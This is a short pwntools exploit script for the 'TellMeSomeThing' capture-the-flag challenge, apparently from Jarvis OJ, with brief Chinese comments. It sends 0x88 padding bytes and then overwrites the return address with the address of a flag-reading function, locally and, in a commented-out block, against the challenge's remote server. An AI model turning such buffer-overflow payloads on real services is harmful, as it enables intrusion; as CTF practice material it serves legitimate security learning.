#!/usr/bin/env python
# coding=utf-8
from pwn import *
################# 
p = process('./TellMeSomeThing.d3d5869bd6fb04dd35b29c67426c0f05')#新建一个flag.txt不然无回显
junk = "A"*0x88		#rbp 长度
addr1 = 0x400620   #read flag.txt函数地址 
payload=""
payload+=junk
payload+=p64(addr1)
p.send(payload)

#################

'''
p = remote('pwn.jarvisoj.com',9876)
junk = "A"*0x88
addr1 = 0x400620
payload=""
payload+=junk
payload+=p64(addr1)
p.send(payload)
'''


#################








p.interactive()
